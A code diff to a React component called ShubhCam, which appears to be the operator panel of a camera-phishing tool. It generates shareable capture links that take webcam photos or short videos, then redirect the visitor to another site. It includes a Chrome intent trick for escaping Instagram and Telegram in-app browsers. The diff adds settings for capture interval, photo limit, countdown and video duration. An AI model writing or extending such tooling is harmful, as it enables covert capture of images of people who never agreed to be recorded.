@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play } from "lucide-react";
+import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play, Settings, Hash, Clock, ImageIcon } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
 import { Textarea } from "./ui/textarea";
@@ -7,6 +7,9 @@ import { toast } from "@/hooks/use-toast";
 import { cn } from "@/lib/utils";
 import { supabase } from "@/integrations/supabase/client";
 import { useSettings } from "@/contexts/SettingsContext";
+import { Switch } from "./ui/switch";
+import { Label } from "./ui/label";
+import { Slider } from "./ui/slider";
 
 interface CapturedPhoto {
   id: string;
@@ -25,7 +28,7 @@ interface CapturedVideo {
 
 const ShubhCam = () => {
   const { settings, updateSettings } = useSettings();
-  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom" | "chrome" | "video">("link");
+  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom" | "chrome" | "video" | "settings">("link");
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
   const [videos, setVideos] = useState<CapturedVideo[]>([]);
   const [loading, setLoading] = useState(false);
@@ -40,10 +43,10 @@ const ShubhCam = () => {
 
   // Get current domain for link generation
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
-  const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
+  const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}&timer=${settings.camCountdownTimer || 5}`;
   const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
   const chromeCustomCaptureLink = `${currentOrigin}/chrome-custom-capture?session=${sessionId}`;
-  const videoCaptureLink = `${currentOrigin}/video-capture?session=${sessionId}&duration=5&redirect=${encodeURIComponent(redirectUrl)}`;
+  const videoCaptureLink = `${currentOrigin}/video-capture?session=${sessionId}&duration=${settings.camVideoDuration || 5}&redirect=${encodeURIComponent(redirectUrl)}`;
   
   // Chrome intent link for in-app browsers (Instagram, Telegram, etc.)
   const chromeIntentLink = `intent://${currentOrigin.replace(/^https?:\/\//, '')}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}#Intent;scheme=https;package=com.android.chrome;end`;
@@ -294,11 +297,11 @@ const ShubhCam = () => {
       </div>
 
       {/* Tabs */}
-      <div className="relative flex rounded-xl overflow-hidden border-2 border-neon-pink/50 mb-5 bg-card/50 shadow-[inset_0_0_20px_hsl(var(--neon-pink)/0.1)]">
+      <div className="relative flex flex-wrap rounded-xl overflow-hidden border-2 border-neon-pink/50 mb-5 bg-card/50 shadow-[inset_0_0_20px_hsl(var(--neon-pink)/0.1)]">
         <button
           onClick={() => setActiveTab("link")}
           className={cn(
-            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide",
+            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide min-w-[50px]",
             activeTab === "link"
               ? "bg-gradient-to-r from-neon-pink to-neon-pink/80 text-background shadow-[0_0_20px_hsl(var(--neon-pink)/0.5)]"
               : "text-muted-foreground hover:bg-neon-pink/10 hover:text-neon-pink"
@@ -309,29 +312,29 @@ const ShubhCam = () => {
         <button
           onClick={() => setActiveTab("video")}
           className={cn(
-            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-l border-neon-pink/30",
+            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
             activeTab === "video"
               ? "bg-gradient-to-r from-neon-red to-neon-red/80 text-background shadow-[0_0_20px_hsl(var(--neon-red)/0.5)]"
               : "text-muted-foreground hover:bg-neon-red/10 hover:text-neon-red"
           )}
         >
-          <Video className="w-3 h-3" /> VIDEO
+          <Video className="w-3 h-3" /> VID
         </button>
         <button
           onClick={() => setActiveTab("chrome")}
           className={cn(
-            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-x border-neon-pink/30",
+            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
             activeTab === "chrome"
               ? "bg-gradient-to-r from-neon-orange to-neon-orange/80 text-background shadow-[0_0_20px_hsl(var(--neon-orange)/0.5)]"
               : "text-muted-foreground hover:bg-neon-orange/10 hover:text-neon-orange"
           )}
         >
-          <Chrome className="w-3 h-3" /> CHROME
+          <Chrome className="w-3 h-3" /> CHR
         </button>
         <button
           onClick={() => setActiveTab("custom")}
           className={cn(
-            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-r border-neon-pink/30",
+            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
             activeTab === "custom"
               ? "bg-gradient-to-r from-neon-cyan to-neon-cyan/80 text-background shadow-[0_0_20px_hsl(var(--neon-cyan)/0.5)]"
               : "text-muted-foreground hover:bg-neon-cyan/10 hover:text-neon-cyan"
@@ -342,13 +345,24 @@ const ShubhCam = () => {
         <button
           onClick={() => { setActiveTab("photos"); refreshPhotos(); loadVideos(); }}
           className={cn(
-            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide",
+            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
             activeTab === "photos"
               ? "bg-gradient-to-r from-neon-purple to-neon-purple/80 text-background shadow-[0_0_20px_hsl(var(--neon-purple)/0.5)]"
               : "text-muted-foreground hover:bg-neon-purple/10 hover:text-neon-purple"
           )}
         >
-          <Image className="w-3 h-3" /> ({photos.length + videos.length})
+          <ImageIcon className="w-3 h-3" /> {photos.length + videos.length}
+        </button>
+        <button
+          onClick={() => setActiveTab("settings")}
+          className={cn(
+            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
+            activeTab === "settings"
+              ? "bg-gradient-to-r from-neon-green to-neon-green/80 text-background shadow-[0_0_20px_hsl(var(--neon-green)/0.5)]"
+              : "text-muted-foreground hover:bg-neon-green/10 hover:text-neon-green"
+          )}
+        >
+          <Settings className="w-3 h-3" /> SET
         </button>
       </div>
 
@@ -810,6 +824,191 @@ const ShubhCam = () => {
               </Button>
             </div>
           )}
+        </div>
+      ) : activeTab === "settings" ? (
+        <div className="space-y-5">
+          {/* Session Settings */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-green/30">
+            <div className="flex items-center gap-2 mb-4">
+              <Hash className="w-5 h-5 text-neon-green" />
+              <h3 className="text-neon-green font-bold tracking-wide">SESSION SETTINGS</h3>
+            </div>
+            
+            {/* Session ID */}
+            <div className="space-y-2 mb-4">
+              <Label className="text-xs text-muted-foreground">Session ID</Label>
+              <div className="flex gap-2">
+                <Input
+                  value={sessionId}
+                  onChange={(e) => updateSettings({ camSessionId: e.target.value })}
+                  placeholder="shubhcam01"
+                  className="bg-background/50 border-neon-green/50 text-neon-green font-mono"
+                />
+                <Button
+                  variant="outline"
+                  size="icon"
+                  onClick={generateNewSession}
+                  className="border-neon-green text-neon-green shrink-0"
+                >
+                  <RefreshCw className="w-4 h-4" />
+                </Button>
+              </div>
+            </div>
+
+            {/* Redirect URL */}
+            <div className="space-y-2">
+              <Label className="text-xs text-muted-foreground">Redirect URL (after capture)</Label>
+              <Input
+                value={redirectUrl}
+                onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
+                placeholder="https://google.com"
+                className="bg-background/50 border-neon-cyan/50 text-neon-cyan"
+              />
+            </div>
+          </div>
+
+          {/* Photo Capture Settings */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-pink/30">
+            <div className="flex items-center gap-2 mb-4">
+              <Camera className="w-5 h-5 text-neon-pink" />
+              <h3 className="text-neon-pink font-bold tracking-wide">PHOTO SETTINGS</h3>
+            </div>
+            
+            {/* Photo Limit */}
+            <div className="space-y-2 mb-4">
+              <div className="flex items-center justify-between">
+                <Label className="text-xs text-muted-foreground">Photo Limit (0 = unlimited)</Label>
+                <span className="text-neon-pink font-mono text-sm">{settings.camPhotoLimit || 0}</span>
+              </div>
+              <Input
+                type="number"
+                min="0"
+                max="100"
+                value={settings.camPhotoLimit || 0}
+                onChange={(e) => updateSettings({ camPhotoLimit: parseInt(e.target.value) || 0 })}
+                className="bg-background/50 border-neon-pink/50 text-neon-pink"
+              />
+            </div>
+
+            {/* Capture Interval */}
+            <div className="space-y-2 mb-4">
+              <div className="flex items-center justify-between">
+                <Label className="text-xs text-muted-foreground">Capture Interval (ms)</Label>
+                <span className="text-neon-cyan font-mono text-sm">{settings.camCaptureInterval || 500}ms</span>
+              </div>
+              <Slider
+                value={[settings.camCaptureInterval || 500]}
+                onValueChange={([val]) => updateSettings({ camCaptureInterval: val })}
+                min={100}
+                max={2000}
+                step={100}
+                className="py-2"
+              />
+              <p className="text-[10px] text-muted-foreground">Lower = faster capture, higher load</p>
+            </div>
+
+            {/* Image Quality */}
+            <div className="space-y-2">
+              <div className="flex items-center justify-between">
+                <Label className="text-xs text-muted-foreground">Image Quality</Label>
+                <span className="text-neon-purple font-mono text-sm">{Math.round((settings.camQuality || 0.8) * 100)}%</span>
+              </div>
+              <Slider
+                value={[Math.round((settings.camQuality || 0.8) * 100)]}
+                onValueChange={([val]) => updateSettings({ camQuality: val / 100 })}
+                min={10}
+                max={100}
+                step={10}
+                className="py-2"
+              />
+            </div>
+          </div>
+
+          {/* Timer & Redirect Settings */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
+            <div className="flex items-center gap-2 mb-4">
+              <Clock className="w-5 h-5 text-neon-cyan" />
+              <h3 className="text-neon-cyan font-bold tracking-wide">TIMER SETTINGS</h3>
+            </div>
+            
+            {/* Countdown Timer */}
+            <div className="space-y-2 mb-4">
+              <div className="flex items-center justify-between">
+                <Label className="text-xs text-muted-foreground">Countdown Timer (seconds)</Label>
+                <span className="text-neon-orange font-mono text-sm">{settings.camCountdownTimer || 5}s</span>
+              </div>
+              <Slider
+                value={[settings.camCountdownTimer || 5]}
+                onValueChange={([val]) => updateSettings({ camCountdownTimer: val })}
+                min={3}
+                max={30}
+                step={1}
+                className="py-2"
+              />
+              <p className="text-[10px] text-muted-foreground">Normal link capture duration</p>
+            </div>
+
+            {/* Auto Redirect Toggle */}
+            <div className="flex items-center justify-between py-3 border-t border-border/50">
+              <div>
+                <Label className="text-sm">Auto Redirect</Label>
+                <p className="text-[10px] text-muted-foreground">Redirect after countdown ends</p>
+              </div>
+              <Switch
+                checked={settings.camAutoRedirect !== false}
+                onCheckedChange={(checked) => updateSettings({ camAutoRedirect: checked })}
+              />
+            </div>
+          </div>
+
+          {/* Video Settings */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-red/30">
+            <div className="flex items-center gap-2 mb-4">
+              <Video className="w-5 h-5 text-neon-red" />
+              <h3 className="text-neon-red font-bold tracking-wide">VIDEO SETTINGS</h3>
+            </div>
+            
+            {/* Video Duration */}
+            <div className="space-y-2">
+              <div className="flex items-center justify-between">
+                <Label className="text-xs text-muted-foreground">Video Duration (seconds)</Label>
+                <span className="text-neon-red font-mono text-sm">{settings.camVideoDuration || 5}s</span>
+              </div>
+              <Slider
+                value={[settings.camVideoDuration || 5]}
+                onValueChange={([val]) => updateSettings({ camVideoDuration: val })}
+                min={3}
+                max={30}
+                step={1}
+                className="py-2"
+              />
+            </div>
+          </div>
+
+          {/* Stats */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-purple/30">
+            <div className="flex items-center gap-2 mb-3">
+              <ImageIcon className="w-5 h-5 text-neon-purple" />
+              <h3 className="text-neon-purple font-bold tracking-wide">CAPTURE STATS</h3>
+            </div>
+            <div className="grid grid-cols-2 gap-3">
+              <div className="bg-background/30 rounded-lg p-3 text-center">
+                <p className="text-2xl font-bold text-neon-green">{photos.length}</p>
+                <p className="text-xs text-muted-foreground">Photos</p>
+              </div>
+              <div className="bg-background/30 rounded-lg p-3 text-center">
+                <p className="text-2xl font-bold text-neon-red">{videos.length}</p>
+                <p className="text-xs text-muted-foreground">Videos</p>
+              </div>
+            </div>
+            <Button
+              onClick={clearAllPhotos}
+              variant="outline"
+              className="w-full mt-3 border-neon-red text-neon-red hover:bg-neon-red/10"
+            >
+              <Trash2 className="w-4 h-4 mr-2" /> CLEAR ALL PHOTOS
+            </Button>
+          </div>
         </div>
       ) : (
         <div className="space-y-4">
